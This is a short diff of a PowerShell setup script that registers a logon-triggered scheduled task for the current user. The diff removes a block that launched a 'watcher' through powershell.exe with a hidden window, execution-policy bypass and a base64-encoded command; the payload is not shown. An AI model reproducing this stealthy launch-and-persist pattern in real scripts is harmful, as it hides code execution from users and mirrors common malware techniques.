@@ -33,7 +33,6 @@ $Principal = New-ScheduledTaskPrincipal `
     -UserId $env:USERNAME `
     -LogonType Interactive
 
-# --- Registrar la tarea con manejo de errores ---
 try {
     Register-ScheduledTask `
         -TaskName $TaskName `
@@ -55,11 +54,6 @@ try {
     Write-Host "Status: active" -ForegroundColor Gray
     Write-Host ""
 }
-
-# --- Lanzar el watcher ya mismo para la demo en vivo ---
-Start-Process powershell.exe `
-    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded" `
-    -WindowStyle Hidden
 
 Start-Sleep -Seconds 2
 Write-Host "Configuration completed." -ForegroundColor Green
